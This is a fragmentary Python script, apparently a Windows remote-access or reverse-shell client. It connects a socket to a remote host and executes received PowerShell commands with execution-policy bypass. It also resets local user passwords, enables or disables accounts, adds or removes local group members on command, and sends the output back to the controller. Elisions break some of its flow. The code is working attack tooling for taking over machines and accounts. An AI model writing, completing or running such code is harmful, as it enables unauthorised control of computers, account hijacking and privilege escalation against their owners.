...
s.connect((host, port))
powershell_exe = "powershell.exe -executionpolicy bypass -NoProfile"
...
while True:
    ...
    if len(data) > 0:
        if decoded_data[0] == '1':
            data2 = s.recv(1024)
            decoded_data2=data2.decode("utf-8").split(",")
            cmd_get = cmd = subprocess.Popen([powershell_exe, decoded_data2],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            ...
            if decoded_data[1] == '1':
                cmd = subprocess.Popen([powershell_exe, "$Password = ConvertTo-SecureString " + decoded_data[3] + " -AsPlainText -Force; $UserAccount = Get-LocalUser -Name " + decoded_data[2] + "; $UserAccount | Set-LocalUser -Password $Password"],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            elif decoded_data[1] == '2':
                cmd = subprocess.Popen([powershell_exe, "Enable-LocalUser -Name " + decoded_data[2]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
            elif decoded_data[1] == '3':
                cmd = subprocess.Popen([powershell_exe, "Disable-LocalUser -Name " + decoded_data[2]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                ...
                currentWD = os.getcwd() + "> "
                s.send(str.encode(output_str + currentWD))
                cmd = subprocess.Popen([powershell_exe, "Add-LocalGroupMember -Group " + decoded_data[3] + " -Member "+ decoded_data[2]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
                ...
                currentWD = os.getcwd() + "> "
                s.send(str.encode(output_str + currentWD))
                cmd = subprocess.Popen([powershell_exe, "Remove-LocalGroupMember -Group " + decoded_data[3] + " -Member "+ decoded_data[2]],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
